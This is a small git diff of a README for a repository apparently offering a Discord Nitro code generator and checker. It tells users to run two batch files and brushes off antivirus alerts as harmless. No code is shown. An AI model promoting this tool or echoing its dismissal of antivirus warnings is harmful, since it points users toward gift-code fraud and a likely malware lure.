@@ -14,11 +14,12 @@ git clone https://github.com/b4db0y01/Discord-Nitro-Generator-Checker.git
 ```
 "install.bat"
 ``` 
-**Then Run the new file**
+**Then run a new file**
 ``` 
 "START-PROGRAM.bat"
 ``` 
 ## ⚠ Sometimes the antivirus can detect "suspicious activity" because the program often accesses the discord API (i solve this problem).
+
 Any Issues Please Let Me Know!
 ##
 ## LICENSE
